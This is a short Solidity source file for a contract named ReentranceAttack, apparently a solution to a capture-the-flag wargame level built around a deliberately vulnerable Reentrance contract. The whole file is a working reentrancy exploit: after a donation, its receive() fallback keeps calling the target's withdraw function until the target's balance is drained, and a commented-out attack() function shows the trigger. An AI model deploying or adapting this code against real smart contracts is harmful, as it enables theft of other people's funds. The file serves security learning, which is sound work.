// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Reentrance.sol';

contract ReentranceAttack {
    Reentrance public target;
    uint public amount = 1000000000000000;

    constructor(address payable _reentrance) public payable {
        target = Reentrance(_reentrance);
    }

   // function attack() external payable {
   //     target.withdraw(amount);
   // }

    function donate() external payable {
        target.donate{value: msg.value, gas: 4000000}(address(this));
    }


    // Fallback is called when Reentrance sends Ether to this contract.
    receive() external payable {
       if (address(target).balance != 0){
            target.withdraw(amount);
       } 
    }   
}